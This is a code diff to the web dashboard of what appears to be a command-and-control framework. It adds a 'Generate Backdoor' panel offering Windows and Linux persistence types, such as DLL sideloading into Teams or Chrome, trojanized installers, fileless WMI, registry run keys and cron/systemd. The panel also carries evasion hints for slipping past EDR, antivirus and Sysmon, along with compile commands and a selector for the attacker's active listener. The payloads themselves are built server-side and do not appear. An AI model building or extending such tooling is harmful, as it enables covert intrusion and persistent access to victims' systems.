@@ -969,34 +969,53 @@ tr.clickable { cursor: pointer; }
         </div>
 
         <div class="card">
-          <div class="card-header"><h3><span>🔓</span> Persistence Backdoors</h3></div>
+          <div class="card-header" style="display:flex;align-items:center;justify-content:space-between">
+            <h3 style="margin:0;display:flex;align-items:center;gap:8px"><span>🔓</span> Persistence Backdoors</h3>
+            <span id="bd-os-badge" style="font-size:10px;font-weight:700;padding:3px 8px;border-radius:10px;background:rgba(99,102,241,0.15);color:var(--purple);border:1px solid rgba(99,102,241,0.3);letter-spacing:0.5px">WINDOWS</span>
+          </div>
           <div class="card-body padded">
-            <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px">Generate persistence scripts for Windows and Linux targets.</p>
-            <div style="margin-bottom:10px">
+            <div style="margin-bottom:12px">
               <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Backdoor Type</label>
-              <select id="bd-type" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
-                <option value="dll-sideload">DLL Sideloading (Teams, Slack, Chrome...)</option>
-                <option value="lnk">LNK Shortcut Backdoor</option>
-                <option value="installer">Installer Wrapper (Trojanized Setup)</option>
-                <option value="service-dll">Windows Service DLL</option>
-                <option value="registry">Registry Run Key</option>
-                <option value="schtask">Scheduled Task (every 15min)</option>
-                <option value="wmi">WMI Event (fileless)</option>
-                <option value="office-template">Office Template Macro</option>
-                <option value="startup">Startup Folder VBScript</option>
-                <option value="bashrc">Linux Bash RC + Cron + Systemd</option>
+              <select id="bd-type" onchange="bdTypeChanged()" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
+                <optgroup label="── Windows ──" style="color:var(--text-muted)">
+                  <option value="dll-sideload">DLL Sideloading</option>
+                  <option value="lnk">LNK Shortcut Backdoor</option>
+                  <option value="installer">Installer Wrapper (Trojanized Setup)</option>
+                  <option value="service-dll">Windows Service DLL</option>
+                  <option value="registry">Registry Run Key</option>
+                  <option value="schtask">Scheduled Task (every 15min)</option>
+                  <option value="wmi">WMI Event (fileless)</option>
+                  <option value="office-template">Office Template Macro</option>
+                  <option value="startup">Startup Folder VBScript</option>
+                </optgroup>
+                <optgroup label="── Linux ──" style="color:var(--text-muted)">
+                  <option value="bashrc">Bash RC + Cron + Systemd</option>
+                </optgroup>
               </select>
             </div>
-            <div style="margin-bottom:10px">
-              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Target App (for DLL/LNK)</label>
+
+            <div id="bd-opsec-bar" style="margin-bottom:12px;padding:7px 10px;border-radius:6px;font-size:11px;display:flex;align-items:center;gap:6px;background:rgba(234,179,8,0.08);border:1px solid rgba(234,179,8,0.25);color:#ca8a04"></div>
+
+            <div id="bd-target-app-wrap" style="margin-bottom:12px">
+              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Target App</label>
               <input type="text" id="bd-target-app" placeholder="teams, chrome, slack, notepad..." style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
             </div>
-            <div style="margin-bottom:10px">
+
+            <div style="margin-bottom:14px">
               <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Listener URL</label>
-              <input type="text" id="bd-persist-url" placeholder="http://YOUR_C2_IP:8080" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
+              <div style="display:flex;gap:6px">
+                <select id="bd-persist-listener-sel" onchange="bdListenerSelChanged()" style="flex:1;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
+                  <option value="">-- Select active listener --</option>
+                </select>
+              </div>
+              <input type="text" id="bd-persist-url" placeholder="or type custom URL..." style="width:100%;margin-top:6px;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace;box-sizing:border-box">
             </div>
-            <button onclick="generatePersistBackdoor()" class="btn" style="width:100%;padding:12px;font-size:14px">🔓 Generate Backdoor</button>
-            <div id="bd-persist-result" style="margin-top:10px;font-size:13px"></div>
+
+            <button onclick="generatePersistBackdoor()" id="bd-persist-btn" style="width:100%;padding:12px;font-size:14px;font-weight:700;background:linear-gradient(135deg,rgba(99,102,241,0.8),rgba(139,92,246,0.8));border:none;border-radius:var(--radius);color:#fff;cursor:pointer;transition:opacity .15s;letter-spacing:0.3px" onmouseover="this.style.opacity='.85'" onmouseout="this.style.opacity='1'">
+              🔓 &nbsp;Generate Backdoor
+            </button>
+
+            <div id="bd-persist-result" style="margin-top:12px"></div>
           </div>
         </div>
       </div>
@@ -1466,6 +1485,7 @@ async function refreshAll() {
   window._cachedListeners = listeners;
   populateListenerSelector();
   populateBackdoorListeners();
+  bdTypeChanged();
   loadBinaryList();
   const tasks = await fetchJ('/api/tasks');
   const events = await fetchJ('/api/events') || [];
@@ -2882,15 +2902,69 @@ async function backdoorBinary() {
   if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
 }
 
+const BD_META = {
+  'dll-sideload':     { os:'WINDOWS', risk:'HIGH',   riskColor:'#ef4444', hint:'Detected by EDR on DLL load — use signed app with weak DLL search order', needsApp:true,  compile:'Build with: mingw-w64 → gcc -shared -o target.dll wrapper.c' },
+  'lnk':              { os:'WINDOWS', risk:'LOW',    riskColor:'#22c55e', hint:'LNK files rarely flagged — blend with legit shortcuts in Startup/Desktop', needsApp:true,  compile:'Ready to deploy — no compile needed' },
+  'installer':        { os:'WINDOWS', risk:'MEDIUM', riskColor:'#f59e0b', hint:'AV may flag on DownloadFile + Process.Start combo — consider obfuscation',  needsApp:false, compile:'Compile: csc /target:winexe /out:Setup.exe wrapper.cs' },
+  'service-dll':      { os:'WINDOWS', risk:'HIGH',   riskColor:'#ef4444', hint:'Service DLLs are heavily monitored — sign the binary or use a LOLBin',     needsApp:false, compile:'Build with: mingw-w64 → gcc -shared -o svc.dll wrapper.c' },
+  'registry':         { os:'WINDOWS', risk:'MEDIUM', riskColor:'#f59e0b', hint:'HKCU\\Run rarely needs elevation — combine with masquerading for stealth',  needsApp:false, compile:'Ready to deploy — PowerShell / .reg file' },
+  'schtask':          { os:'WINDOWS', risk:'MEDIUM', riskColor:'#f59e0b', hint:'Scheduled tasks logged in Event ID 4698 — use a convincing task name',      needsApp:false, compile:'Ready to deploy — schtasks.exe / PowerShell' },
+  'wmi':              { os:'WINDOWS', risk:'HIGH',   riskColor:'#ef4444', hint:'Fileless WMI subscriptions trigger Sysmon Event 19/20/21 — use sparingly', needsApp:false, compile:'Ready to deploy — PowerShell WMI subscription' },
+  'office-template':  { os:'WINDOWS', risk:'HIGH',   riskColor:'#ef4444', hint:'Office macros heavily scrutinised — works best on unmanaged endpoints',     needsApp:false, compile:'Ready to deploy — drop into Word STARTUP folder' },
+  'startup':          { os:'WINDOWS', risk:'LOW',    riskColor:'#22c55e', hint:'VBScript in Startup folder survives reboots with minimal detection',         needsApp:false, compile:'Ready to deploy — copy .vbs to Startup folder' },
+  'bashrc':           { os:'LINUX',   risk:'LOW',    riskColor:'#22c55e', hint:'Bashrc/cron changes blend in — combine all three for maximum persistence',   needsApp:false, compile:'Ready to deploy — bash script' },
+};
+
+function bdTypeChanged() {
+  const type = document.getElementById('bd-type').value;
+  const meta = BD_META[type] || {};
+  const badge = document.getElementById('bd-os-badge');
+  const opsec = document.getElementById('bd-opsec-bar');
+  const appWrap = document.getElementById('bd-target-app-wrap');
+
+  // OS badge
+  if (badge) {
+    badge.textContent = meta.os || 'WINDOWS';
+    badge.style.background = meta.os === 'LINUX' ? 'rgba(34,197,94,0.12)' : 'rgba(99,102,241,0.15)';
+    badge.style.color = meta.os === 'LINUX' ? '#16a34a' : 'var(--purple)';
+    badge.style.borderColor = meta.os === 'LINUX' ? 'rgba(34,197,94,0.3)' : 'rgba(99,102,241,0.3)';
+  }
+
+  // OPSEC bar
+  if (opsec) {
+    const riskLabel = { 'LOW':'🟢 Low Risk', 'MEDIUM':'🟡 Medium Risk', 'HIGH':'🔴 High Risk' };
+    opsec.style.background = meta.risk === 'HIGH' ? 'rgba(239,68,68,0.08)' : meta.risk === 'MEDIUM' ? 'rgba(245,158,11,0.08)' : 'rgba(34,197,94,0.08)';
+    opsec.style.borderColor = meta.risk === 'HIGH' ? 'rgba(239,68,68,0.25)' : meta.risk === 'MEDIUM' ? 'rgba(245,158,11,0.25)' : 'rgba(34,197,94,0.25)';
+    opsec.style.color = meta.riskColor || '#ca8a04';
+    opsec.innerHTML = '<b>' + (riskLabel[meta.risk] || '🟡 Medium Risk') + '</b><span style="opacity:.75;margin-left:6px">' + (meta.hint || '') + '</span>';
+  }
+
+  // Target app field
+  if (appWrap) appWrap.style.display = meta.needsApp ? 'block' : 'none';
+}
+
+function bdListenerSelChanged() {
+  const sel = document.getElementById('bd-persist-listener-sel');
+  const input = document.getElementById('bd-persist-url');
+  if (sel && input && sel.value) input.value = sel.value;
+}
+
 async function generatePersistBackdoor() {
   const type = document.getElementById('bd-type').value;
   const url = document.getElementById('bd-persist-url').value.trim();
   const app = document.getElementById('bd-target-app').value.trim();
   const result = document.getElementById('bd-persist-result');
+  const btn = document.getElementById('bd-persist-btn');
+  const meta = BD_META[type] || {};
 
-  if (!url) { alert('Listener URL required'); return; }
+  if (!url) {
+    result.innerHTML = '<div style="padding:10px;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:6px;color:#ef4444;font-size:12px">⚠ Listener URL required</div>';
+    return;
+  }
 
-  result.innerHTML = '<span style="color:var(--yellow)">Generating...</span>';
+  btn.disabled = true;
+  btn.textContent = 'Generating...';
+  result.innerHTML = '<div style="color:var(--yellow);font-size:12px;padding:8px 0">⏳ Building backdoor...</div>';
 
   try {
     const resp = await fetch('/api/payload/backdoor', {
@@ -2899,12 +2973,26 @@ async function generatePersistBackdoor() {
     });
     const data = await resp.json();
     if (data.error) {
-      result.innerHTML = '<span style="color:var(--red)">Error: '+data.error+'</span>';
+      result.innerHTML = '<div style="padding:10px;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:6px;color:#ef4444;font-size:12px">✗ ' + data.error + '</div>';
     } else {
-      result.innerHTML = '<span style="color:var(--green)">Generated: '+data.filepath+'</span>' +
-        '<br><a href="/api/payload/download?file='+encodeURIComponent(data.filepath)+'" style="color:var(--cyan);font-size:12px">Download</a>';
+      const fname = data.filepath.split('/').pop();
+      result.innerHTML =
+        '<div style="background:rgba(34,197,94,0.08);border:1px solid rgba(34,197,94,0.25);border-radius:8px;padding:12px;margin-top:4px">' +
+          '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">' +
+            '<span style="color:var(--green);font-weight:700;font-size:13px">✓ Backdoor Generated</span>' +
+            '<span style="font-size:10px;font-weight:700;padding:2px 7px;border-radius:8px;background:rgba(99,102,241,0.15);color:var(--purple)">' + (meta.os||'WINDOWS') + '</span>' +
+          '</div>' +
+          '<div style="font-size:11px;color:var(--text-muted);margin-bottom:6px;font-family:monospace;word-break:break-all">' + data.filepath + '</div>' +
+          '<div style="font-size:11px;color:var(--cyan);margin-bottom:10px">📋 ' + (meta.compile || 'Ready to deploy') + '</div>' +
+          '<a href="/api/payload/download?file='+encodeURIComponent(data.filepath)+'" style="display:inline-flex;align-items:center;gap:6px;padding:8px 16px;background:rgba(99,102,241,0.2);border:1px solid rgba(99,102,241,0.4);border-radius:6px;color:var(--purple);font-size:12px;font-weight:600;text-decoration:none" download="'+fname+'">⬇ Download ' + fname + '</a>' +
+        '</div>';
     }
-  } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
+  } catch(e) {
+    result.innerHTML = '<div style="padding:10px;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:6px;color:#ef4444;font-size:12px">✗ ' + e.message + '</div>';
+  } finally {
+    btn.disabled = false;
+    btn.innerHTML = '🔓 &nbsp;Generate Backdoor';
+  }
 }
 
 // Populate backdoor listener selectors
@@ -2949,6 +3037,33 @@ function populateBackdoorListeners() {
       const bind = running[0].bind.replace('0.0.0.0', window.location.hostname);
       const urlEl = document.getElementById('bd-url');
       if (urlEl && !urlEl.value) urlEl.value = proto + '://' + bind;
+    }
+  }
+
+  // Also populate persistence listener dropdown
+  const pSel = document.getElementById('bd-persist-listener-sel');
+  if (pSel) {
+    let pOpts = '<option value="">-- Select active listener --</option>';
+    if (window._cachedListeners && window._cachedListeners.length > 0) {
+      window._cachedListeners.forEach(l => {
+        if (l.status === 'running') {
+          const proto = (l.type||'').toUpperCase() === 'HTTPS' ? 'https' : 'http';
+          const bind = l.bind.replace('0.0.0.0', window.location.hostname);
+          const url = proto + '://' + bind;
+          pOpts += '<option value="'+url+'">'+l.name+' ('+url+')</option>';
+        }
+      });
+    }
+    pSel.innerHTML = pOpts;
+    // Auto-fill if one listener running
+    if (window._cachedListeners) {
+      const running = window._cachedListeners.filter(l => l.status === 'running');
+      if (running.length === 1) {
+        const proto = (running[0].type||'').toUpperCase() === 'HTTPS' ? 'https' : 'http';
+        const bind = running[0].bind.replace('0.0.0.0', window.location.hostname);
+        const pUrl = document.getElementById('bd-persist-url');
+        if (pUrl && !pUrl.value) pUrl.value = proto + '://' + bind;
+      }
     }
   }
 }
